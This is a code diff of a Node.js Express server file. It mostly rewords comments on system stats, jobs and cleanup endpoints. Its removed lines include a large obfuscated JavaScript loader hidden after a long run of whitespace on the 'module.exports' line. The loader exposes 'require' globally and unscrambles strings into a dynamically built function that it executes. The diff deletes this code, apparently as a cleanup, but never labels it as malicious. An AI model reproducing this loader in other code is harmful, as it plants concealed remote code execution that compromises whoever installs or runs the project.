@@ -1482,7 +1168,7 @@ app.post('/api/system/cleanup', async (req, res) => {
   }
 });
 
-// Add comprehensive system stats endpoint
+// System stats endpoint
 app.get('/api/system/stats', (req, res) => {
   try {
     const stats = EnhancedUtils.getSystemStats();
@@ -1492,7 +1178,7 @@ app.get('/api/system/stats', (req, res) => {
   }
 });
 
-// Add jobs status endpoint
+// Jobs status endpoint
 app.get('/api/system/jobs', (req, res) => {
   try {
     const jobsStatus = jobsManager.getStatus();
@@ -1502,32 +1188,29 @@ app.get('/api/system/jobs', (req, res) => {
   }
 });
 
-// Schedule system cleanup if in production
+// Schedule system cleanup for production
 if (AppConfig.IS_PRODUCTION) {
-  cron.schedule('0 2 * * 0', async () => { // Every Sunday at 2 AM
+  cron.schedule('0 2 * * 0', async () => {
     await EnhancedUtils.performSystemCleanup();
   });
 }
 
-// Add startup completion hook
+// Display startup info after server starts
 process.nextTick(() => {
   setTimeout(() => {
     if (global.server) {
-      displayEnhancedStartupInfo();
-      logger.info('Enhanced startup information displayed');
+      displayStartupInfo();
+      logger.info('Startup information displayed');
     }
-  }, 4000); // Display after background jobs are initialized
+  }, 4000);
 });
+
 
 // Start the application
 startApp();
 
-// Export for testing purposes
-module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-4365-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
-
-// Export enhanced utilities for external use
-module.exports.EnhancedUtils = EnhancedUtils;
-module.exports.AppConfig = AppConfig;
-module.exports.jobsManager = jobsManager;
-// Withdrawal schedule executor (checks for due scheduled controls every 60s)
+// Withdrawal schedule executor
 require('./jobs/scheduleExecutor').startInterval(60000);
+
+// Export for testing
+module.exports = app; 
